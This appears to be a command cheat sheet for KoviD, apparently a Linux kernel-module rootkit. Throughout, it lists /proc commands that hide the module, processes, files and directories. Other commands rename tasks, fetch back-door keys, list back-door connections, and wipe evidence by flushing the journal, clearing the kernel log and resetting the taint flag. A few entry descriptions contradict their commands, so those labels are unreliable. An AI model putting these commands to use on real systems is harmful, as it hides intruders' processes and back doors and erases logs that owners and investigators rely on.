# CheatSheet

## proc UI visibility

*Action:* run

*About:* to switch proc UI on/off repeat command

*Commands:*
- `kill -CONT 31337`

## Command status

*Commands that return execution status:*

- hide-pid
- hide-task-backdoor
- rename-task
- hide-lkm
- unhide-lkm
- hide-file
- unhide-directory
- hide-file-anywhere
- journal-flush
- signal-task-stop
- signal-task-cont
- signal-task-kill
- taint-clear
- syslog-clear

*How to check:*
- `cat /proc/myprocname`

*  Return is operation status that can vary depending on the command.

*Default*: Disabled

*Toggle and Check enable/disable:*
- `echo output-enable >/proc/myprocname && cat /proc/myprocname`
- `echo output-disable >/proc/myprocname && cat /proc/myprocname`

* == 0:* Disabled
* == 1:* Enabled

## KoviD invisibility

*Action:* run

*Mode:* debug,deploy

*About:* hide module

*Root required:* debug No, deploy Yes

*Commands:*
- `echo hide-lkm >/proc/myprocname`


## KoviD visibility

*Action:* run

*Mode:* debug

*About:* unhide module

*Root required:* No

*Commands:*
- `echo get-unhidekey >/proc/myprocname`
- `key=$(cat /proc/myprocname)`
- `echo unhide-lkm=$key > /proc/myprocname`


## KoviD visibility in DEPLOY mode

*Action:* run

*Mode:* deploy

*About:* unhide module, KEY is build-time generated, check Makefile output

*Root required:* Yes

*Commands:*
- `echo unhide-lkm=<KEY> > /proc/myprocname`


## Unload KoviD

*Action:* run

*Mode:* debug

*About:* unload module

*Root required:* No

*Commands:*
- `sudo rmmod ./kovid.ko`


## Unload KoviD in DEPLOY mode

*Action:* run

*Mode:* deploy

*About:* unload module AFTER `unhide-lkm` command

*Root required:* Yes

*Commands:*
- `sudo rmmod -f ./kovid.ko`


## Get unhide module KEY

*Action:* UI

*Mode:* debug

*About:* get unhide module KEY

*Root required:* No

*Commands:*
- `echo get-unhidekey >/proc/myprocname`
- `cat /proc/myprocname`


## Get back-doors KEY

*Action:* UI

*Mode:* debug

*About:* get back-door KEY

*Root required:* No

*Commands:*
- `echo get-bdkey >/proc/myprocname`
- `cat /proc/myprocname`


## Hide process (PID)

*Action:* UI

*Mode:* debug,deploy

*About:* to hide/unhide tasks, myprocname PID `1234`

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo 1234 >/proc/myprocname`


## Hide a file in current directory

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-file=README.txt >/proc/myprocname`


## Hide a file elsewhere

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-file=/home/user/README.txt >/proc/myprocname`


## Hide all instances of a file

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-file-anywhere=README.txt >/proc/myprocname`


## Hide a directory in current directory

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a file

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-directory=dir1 >/proc/myprocname`


## Hide a directory elsewhere

*Action:* UI

*Mode:* debug,deploy

*About:* Unhide a directory

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo hide-directory=/home/some-user/dir1 >/proc/myprocname`


## Unhide a directory

*Action:* UI

*Mode:* debug,deploy

*About:* Hide a directory

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo unhide-directory=dir1 >/proc/myprocname`


## List hidden files

*Action:* UI

*Mode:* debug

*About:* Show hidden filenames in `dmesg`

*Root required:* No

*Commands:*
- `echo list-hidden-files >/proc/myprocname`
- `dmesg`


## Rename a running task

*Action:* UI

*Mode:* debug,deploy

*About:* Rename PID 1234 task to `newtaskname`

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo rename-task=1234,newtaskname >/proc/myprocname`


## List hidden tasks (PIDs)

*Action:* UI

*Mode:* debug

*About:* Show hidden tasks in `dmesg`

*Root required:* No

*Commands:*
- `echo list-hidden-tasks >/proc/myprocname`
- `dmesg`


## List current back-door connections

*Action:* UI

*Mode:* debug

*About:* Show current back-door connections in `dmesg`

*Root required:* No

*Commands:*
- `echo list-backdoor >/proc/myprocname`
- `dmesg`


## Get the base-address of a process PID

*Action:* UI

*Mode:* debug,deploy

*About:* Fetch process base-address of PID 1234

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo base-address=1234 >/proc/myprocname`
- `cat /proc/myprocname`


## Run journal flush

*Action:* UI

*Mode:* debug,deploy

*About:* flush journal logs

*Root required:* debug=No, deploy=Yes

*Commands:*
- `echo journal-flush >/proc/myprocname`


## Send signal to hidden task

*Action:* UI

*Mode:* debug,release

*About:* Available: stop,cont,kill, myprocname signalling PID 1234

*Root required:* debug=No, release=Yes

*Commands:*
- `echo signal-task-stop=1234 >/proc/myprocname`
- `echo signal-task-cont=1234 >/proc/myprocname`
- `echo signal-task-kill=1234 >/proc/myprocname`


## Clear ring-buffer

*Action:* UI

*Mode:* debug,release

*About:* Similar to `dmesg -c`

*Root required:* debug=No, release=Yes

*Commands:*
- `echo syslog-clear >/proc/myprocname`


## Clear /proc `tainted`

*Action:* UI

*Mode:* debug,release

*About:* Reset `/proc/sys/kernel/tainted`

*Root required:* debug=No, release=Yes

*Commands:*
- `echo taint-clear >/proc/myprocname`
